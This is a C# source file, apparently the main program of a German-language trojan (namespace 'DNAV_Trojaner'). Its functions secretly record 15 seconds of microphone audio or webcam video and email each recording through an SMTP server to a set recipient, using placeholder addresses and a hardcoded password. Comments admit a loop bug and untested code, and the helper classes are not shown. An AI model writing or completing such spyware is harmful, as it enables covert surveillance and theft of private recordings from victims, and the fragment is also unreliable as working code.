using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace DNAV_Trojaner {
    class Program {
        static public void Tonaufnahme() {
             //! Daten richtig angeben
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            Audio.SetPath("TestAudio");
            Audio.Start(sec, (path) => {
                m.send("Neue Audiodatei", "Eine neue Datei verfügbar:", path);
            });
        }

         static public void Camaufnahme() {
             //! Daten richtig angeben
            Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
            int sec = 15;
            Cam.SetPath("TestVideo");
            Cam.Start(sec, (path) => { 
                m.send("Neue Videodatei", "Eine neue Datei verfügbar:", path); 
            });
        }

        static void Main(string[] args) {
            //Camaufnahme();
            //!Fehler beim Loop!!

            //? Konnte noch nicht getestet werden - könnte aber klappen
            Cam.Start();
            System.Threading.Thread.Sleep(10000);
            Cam.Stop();
        }
    }
}
